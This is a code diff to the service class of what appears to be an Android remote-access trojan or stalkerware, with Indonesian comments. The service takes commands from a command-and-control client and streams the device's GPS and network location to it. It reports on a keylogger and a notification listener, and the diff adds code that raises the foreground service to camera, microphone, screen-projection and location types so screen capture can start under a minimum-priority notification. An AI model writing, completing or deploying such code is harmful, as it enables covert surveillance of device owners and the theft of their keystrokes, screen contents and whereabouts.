@@ -28,6 +28,8 @@ public class AgentService extends Service implements C2Client.Sink {
 
     public static AgentService instance;
 
+    private static final int NOTIF_ID = 0x4d5a;
+
     private C2Client client;
     private MediaModule media;
     private ScreenModule screen;
@@ -36,6 +38,7 @@ public class AgentService extends Service implements C2Client.Sink {
     private LocationListener listener;
     private boolean locating;
     private Boolean rootCache;
+    private int fgType = 0;
     private final List<String> keys = new ArrayList<>();
 
     @Override
@@ -57,6 +60,11 @@ public class AgentService extends Service implements C2Client.Sink {
     }
 
     private void startFg() {
+        startFgWith(ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+    }
+
+    private void startFgWith(int type) {
+        if (type == fgType) return;
         String ch = "mzk_core";
         NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
         if (Build.VERSION.SDK_INT >= 26 && nm != null) {
@@ -73,12 +81,27 @@ public class AgentService extends Service implements C2Client.Sink {
                 .setOngoing(true)
                 .setPriority(Notification.PRIORITY_MIN)
                 .build();
+        try {
+            if (Build.VERSION.SDK_INT >= 29) startForeground(NOTIF_ID, n, type);
+            else startForeground(NOTIF_ID, n);
+            fgType = type;
+        } catch (Exception e) {
+            try {
+                startForeground(NOTIF_ID, n);
+                fgType = 0;
+            } catch (Exception ignored) {
+            }
+        }
+    }
+
+    /** Naikkan tipe FGS saat projection aktif. Panggil dari activity yang terlihat. */
+    public void upgradeFg() {
         if (Build.VERSION.SDK_INT >= 29) {
-            startForeground(0x4d5a, n,
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-                            | ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
-        } else {
-            startForeground(0x4d5a, n);
+            startFgWith(ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                    | ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
+                    | ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+                    | ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                    | ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
         }
     }
 
@@ -100,7 +123,10 @@ public class AgentService extends Service implements C2Client.Sink {
         super.onTaskRemoved(root);
     }
 
-    @Override public IBinder onBind(Intent i) { return null; }
+    @Override
+    public IBinder onBind(Intent i) {
+        return null;
+    }
 
     @Override
     public void onDestroy() {
@@ -112,13 +138,18 @@ public class AgentService extends Service implements C2Client.Sink {
         super.onDestroy();
     }
 
-    @Override public void onReady() { }
+    @Override
+    public void onReady() {
+    }
 
-    @Override public void onCommand(String id, String type, JSONObject args) {
+    @Override
+    public void onCommand(String id, String type, JSONObject args) {
         router.handle(id, type, args);
     }
 
-    @Override public void onDown() { }
+    @Override
+    public void onDown() {
+    }
 
     public void reconnect() {
         try { client.stop(); } catch (Exception ignored) { }
@@ -150,32 +181,47 @@ public class AgentService extends Service implements C2Client.Sink {
         locating = true;
         lm = (LocationManager) getSystemService(LOCATION_SERVICE);
         listener = new LocationListener() {
-            @Override public void onLocationChanged(Location loc) {
+            @Override
+            public void onLocationChanged(Location loc) {
                 try {
                     JSONObject o = new JSONObject();
                     o.put("lat", loc.getLatitude());
                     o.put("lon", loc.getLongitude());
                     o.put("acc", loc.getAccuracy());
                     if (client != null) client.stream("loc", "", o);
-                } catch (Exception ignored) { }
+                } catch (Exception ignored) {
+                }
             }
-            @Override public void onStatusChanged(String p, int s, android.os.Bundle b) { }
-            @Override public void onProviderEnabled(String p) { }
-            @Override public void onProviderDisabled(String p) { }
+
+            @Override
+            public void onStatusChanged(String p, int s, android.os.Bundle b) {
+            }
+
+            @Override
+            public void onProviderEnabled(String p) {
+            }
+
+            @Override
+            public void onProviderDisabled(String p) {
+            }
         };
         try {
             if (lm != null) {
-                lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 3000, 2f, listener, Looper.getMainLooper());
-                lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 4f, listener, Looper.getMainLooper());
+                lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 3000, 2f,
+                        listener, Looper.getMainLooper());
+                lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 4f,
+                        listener, Looper.getMainLooper());
             }
-        } catch (Exception ignored) { }
+        } catch (Exception ignored) {
+        }
     }
 
     public void stopLocate() {
         locating = false;
         try {
             if (lm != null && listener != null) lm.removeUpdates(listener);
-        } catch (Exception ignored) { }
+        } catch (Exception ignored) {
+        }
         listener = null;
     }
 
@@ -183,6 +229,13 @@ public class AgentService extends Service implements C2Client.Sink {
         Intent i = new Intent(this, MainActivity.class);
         i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
         startActivity(i);
+    }
+
+    /** Dipanggil dari MainActivity setelah izin projection diberikan. */
+    public void setProjection(Intent data, int resultCode) {
+        if (data == null) return;
+        upgradeFg();
+        screen.start(this, data, resultCode);
     }
 
     public JSONObject netInfo() {
@@ -195,7 +248,8 @@ public class AgentService extends Service implements C2Client.Sink {
             o.put("root", isRoot());
             o.put("notif", NotifListener.alive());
             o.put("keylog", KeylogService.alive());
-        } catch (Exception ignored) { }
+        } catch (Exception ignored) {
+        }
         return o;
     }
 
@@ -220,4 +274,12 @@ public class AgentService extends Service implements C2Client.Sink {
             }
         }, "mzk-delay").start();
     }
+
+    /** Dipakai Router untuk menghentikan service. */
+    public void kill() {
+        stopSelf();
+    }
+
+    /** Activity aktif untuk permintaan izin layar. */
+    public Activity activityRef;
 }
